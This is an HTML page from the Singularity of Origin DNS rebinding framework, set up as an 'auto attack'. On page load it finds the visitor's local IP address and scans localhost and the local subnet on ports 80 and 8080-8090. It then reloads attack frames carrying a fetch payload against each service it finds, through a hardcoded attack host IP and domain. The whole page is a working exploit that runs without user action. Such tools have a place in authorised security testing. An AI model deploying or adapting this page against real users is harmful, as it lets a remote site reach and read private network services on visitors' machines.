<!doctype html>
<html lang="en">

<head>
    <title>Singularity of Origin DNS Rebinding Auto Attack</title>
    <script src="manager.js"></script>
    <script src=scan-manager.js></script>
    <meta charset="utf-8">
    <meta http-equiv="x-dns-prefetch-control" content="off">
</head>

<body>
    <script>
        const configuration = {
            attackHostIPAddress: '80.85.86.45',
            attackHostDomain: 'dynamic.occalis.net',
            rebindingStrategy: 'FromQueryFirstThenSecond',
            //const rebindingStrategy = 'FromQueryMultiA',
            interval: "20",
            indexToken: "<!--thisismytesttoken-->"
        };
        
        app.getConfiguration().setManually(configuration);

        const addrSpec = `127.0.0.1,0.0.0.0`;
        const portSpec = '80,8080-8090';
        const payload = 'payload-simple-fetch-get.html';

        function scanFoundNewTargetCb(result) {
            console.log(result);
            document.getElementById("activity").innerHTML += JSON.stringify(result, null, 4) + "<br/>";
            attackTarget(result.target.address, result.target.port, payload)
        }

        function scanDoneCb(results) {
            document.getElementById("activity").innerHTML += "Done.<br/>";
            setTimeout(function () {
                sm.shutDown();
            }, 3000);
        }

        function getLocalIpAddressThenScan2() {
            sm = ScanManager();
            getLocalIpAddress()
                .then(address => {
                        const range = `${address.split('.', 3).join('.')}.1-254`;
                        sm.run(`${addrSpec},${range}`, portSpec, scanFoundNewTargetCb, scanDoneCb);
                    },
                    e => {
                        console.log(e);
                        sm.run(`${addrSpec},192.168.1.1-254`, portSpec, scanFoundNewTargetCb, scanDoneCb);

                    })
        }

        getLocalIpAddressThenScan2();

        function attackTarget(targetAddress, targetPort, payload) {
            let self = this;
            let fid = app.getFrameManager().addFrame(app.generateAttackUrl(targetAddress, targetPort, payload))

            app.addFrameToDOM(app.getFrameManager().frame(fid));
            app.getFrameManager().frame(fid).setTimer(setInterval((() => {
                app.reloadAttackFrame(app.getFrameManager().frame(fid))
            }), parseInt(app.getConfiguration().getInterval()) * 1000));

        }
    </script>

    <div id="activity"></div>
    <div id=attackframes></div>
    <iframe id=delaydomloadframe src="/delaydomload" class="d-none"></iframe>

</body>

</html>